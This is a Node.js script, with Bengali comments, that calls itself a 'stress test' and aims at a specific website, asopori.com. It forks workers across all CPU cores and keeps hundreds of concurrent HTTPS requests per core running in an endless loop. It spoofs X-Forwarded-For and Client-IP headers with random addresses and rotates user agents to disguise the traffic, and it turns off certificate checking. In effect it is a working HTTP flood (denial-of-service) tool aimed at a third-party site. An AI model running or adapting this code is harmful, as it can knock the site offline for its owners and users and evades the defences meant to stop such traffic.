const https = require('https');
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;

const targetUrl = 'https://asopori.com/';
const PRINT_INTERVAL = 10000;

// রেন্ডম আইপি জেনারেট করার ফাংশন
const getRandomIP = () => {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
};

// রেন্ডম ইউজার এজেন্ট (বিভিন্ন ডিভাইস সিমুলেট করতে)
const getRandomUserAgent = () => {
    const agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36"
    ];
    return agents[Math.floor(Math.random() * agents.length)];
};

if (cluster.isMaster) {
    let totalRequests = 0;
    console.log(`🔥 Stress Test Started on: ${targetUrl}`);
    console.log(`🧵 Cores Utilization: ${numCPUs}`);

    for (let i = 0; i < numCPUs; i++) {
        const worker = cluster.fork();
        worker.on('message', (msg) => { totalRequests += msg.data; });
    }

    setInterval(() => {
        console.log(`📊 Total (10s): ${totalRequests.toLocaleString()} | Avg: ${(totalRequests / 10).toLocaleString()} req/sec`);
        totalRequests = 0;
    }, PRINT_INTERVAL);

} else {
    const agent = new https.Agent({
        keepAlive: true,
        keepAliveMsecs: 60000,
        maxSockets: Infinity,
        maxFreeSockets: 2048,
        rejectUnauthorized: false
    });

    let batchCount = 0;
    setInterval(() => {
        if (batchCount > 0) {
            process.send({ type: 'count', data: batchCount });
            batchCount = 0;
        }
    }, 1000);

    function startLoad() {
        const options = {
            method: 'GET',
            agent: agent,
            headers: {
                'X-Forwarded-For': getRandomIP(), // সার্ভারকে রেন্ডম আইপি দেখাবে
                'Client-IP': getRandomIP(),
                'User-Agent': getRandomUserAgent(), // রেন্ডম ডিভাইস দেখাবে
                'Connection': 'keep-alive'
            }
        };

        const req = https.get(targetUrl, options, (res) => {
            res.on('data', () => { });
            res.on('end', () => {
                batchCount++;
                setImmediate(startLoad); // রিকার্সন স্ট্যাক ঠিক রাখতে setImmediate ব্যবহার করা ভালো
            });
        });

        req.on('error', () => {
            batchCount++;
            setTimeout(startLoad, 5); // এরর হলে সামান্য গ্যাপ দিয়ে আবার শুরু
        });

        req.end();
    }

    const initialConcurrency = 400;
    for (let i = 0; i < initialConcurrency; i++) {
        startLoad();
    }
}
